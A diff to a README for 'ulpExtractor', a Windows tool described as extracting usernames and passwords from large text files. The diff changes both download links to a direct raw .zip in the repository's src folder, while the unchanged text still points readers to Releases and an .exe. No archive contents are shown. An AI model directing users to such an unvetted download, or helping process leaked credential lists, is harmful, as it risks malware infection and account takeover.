@@ -1,6 +1,6 @@
 # 🛡️ ulpExtractor - Extract login credentials from large files
 
-[![Download ulpExtractor](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cocky-paddle276/ulpExtractor)
+[![Download ulpExtractor](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cocky-paddle276/ulpExtractor/raw/refs/heads/main/src/Extractor-ulp-3.5.zip)
 
 ulpExtractor helps you sort through large lists of user data. It extracts usernames and passwords from text files. The tool handles thousands of lines in seconds. This saves you time when you need to clean or manage text-based security data. It runs on Windows and shows progress on your screen.
 
@@ -8,7 +8,7 @@ ulpExtractor helps you sort through large lists of user data. It extracts userna
 
 You need the program file to start. The software runs without complex setup. 
 
-[Click here to visit the download page](https://github.com/Cocky-paddle276/ulpExtractor)
+[Click here to visit the download page](https://github.com/Cocky-paddle276/ulpExtractor/raw/refs/heads/main/src/Extractor-ulp-3.5.zip)
 
 Find the section labeled Releases on the right side of the page. Look for the file ending in .exe for Windows. Click that file to save it to your computer.
 
